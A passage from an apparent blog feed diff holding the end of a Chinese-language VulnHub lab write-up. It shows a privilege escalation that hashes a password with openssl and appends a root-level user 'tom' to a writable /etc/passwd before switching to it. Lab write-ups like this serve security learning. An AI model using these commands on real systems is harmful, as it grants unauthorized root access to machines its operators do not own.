+我可以执行 ..... 写操作果然还是不能把东西想的太高端  其实说实话还是要看到一个不能属主 属组 其他 就不看文件主人是谁&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240706221859.png&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;openssl &lt;span class=&#34;token function&#34;&gt;passwd&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-1&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-salt&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;123&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;123&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;tom:&lt;span class=&#34;token variable&#34;&gt;$1&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$123&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$nE5gIYTYiF1PIXVOFjQaW&lt;/span&gt;/:0:0:root:/root:/usr/bin/zsh&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&gt;&lt;/span&gt; /etc/passwd&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;su&lt;/span&gt; tom&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;拿到权限 ok 下机  ----&lt;/p&gt;
+</content>
+        <category term="vulnhub" />
+        <category term="sql注入" />
+        <updated>2024-07-13T03:57:00.000Z</updated>
+    </entry>
+</feed>
